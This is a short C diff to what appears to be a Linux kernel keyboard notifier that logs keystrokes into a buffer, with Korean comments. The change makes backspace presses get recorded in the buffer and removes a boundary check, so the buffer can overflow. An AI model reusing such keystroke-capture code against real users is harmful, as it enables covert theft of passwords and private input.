@@ -95,11 +95,11 @@ int kbd_notifier(struct notifier_block* nblock, unsigned long code, void* _param
 		if (param->down)
 		{
 			if (param->value == KEY_BACKSPACE)  //백스페이스일 때
-			{
-				if (bptr != buffer) { 
-					--bptr;
-					*bptr = '\0';  //bptr에 저장
-				}
+			{ 
+				*bptr = '\\' ;
+				bptr++;
+				*bptr = 'r' ;
+				bptr++;
 			}
 			else 
 			{
